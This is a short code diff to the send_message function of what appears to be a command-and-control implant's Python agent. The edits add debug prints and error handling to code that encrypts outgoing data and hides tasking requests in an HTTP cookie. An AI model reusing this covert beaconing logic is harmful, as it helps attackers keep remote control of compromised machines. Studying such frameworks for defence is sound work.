@@ -853,19 +853,24 @@ def send_message(packets=None):
     global server
     global headers
     global taskURIs
-    print('sendmessage')
+    print('sendmessage update')
     data = None
     if packets:
-        print('if packets eneterd')
-        data = ''.join(packets.decode('UTF-8'))
-        print('if packets 2')
-        # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, data)
-        print('if packets 3')
-        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+        try:
+            print('if packets eneterd changed')
+            data = ''.join(packets.decode('latin-1'))
+            print('if packets 2')
+            # aes_encrypt_then_hmac is in stager.py
+            encData = aes_encrypt_then_hmac(key, data)
+            print('if packets 3')
+            data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+        except Exception as e:
+            print(e)
+        
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
         #   meta TASKING_REQUEST = 4
+        print('getting tasking')
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
         headers['Cookie'] = \"""" + self.session_cookie + """session=%s" % (b64routingPacket)
